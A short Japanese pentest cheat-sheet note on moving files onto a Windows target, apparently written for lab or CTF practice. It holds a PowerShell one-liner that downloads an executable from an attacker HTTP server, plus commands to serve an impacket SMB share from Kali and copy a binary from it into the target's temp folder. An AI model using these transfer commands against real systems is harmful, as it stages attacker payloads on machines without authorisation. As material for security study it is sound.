# FileUpload


```
powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.9.27.249:8000/sheshe.exe','sheshe.exe')"
```

## smb使うパターン
on Kali

```
kali@kali:~$ sudo python /home/kali/impacket/examples/smbserver.py share .
```

on target 

```
c:\ > copy \\10.10.14.8\share\pr.exe  c:\windows\temp
```

## 参考になりそう

- https://binary-pulsar.hatenablog.jp/entry/2018/11/28/090000
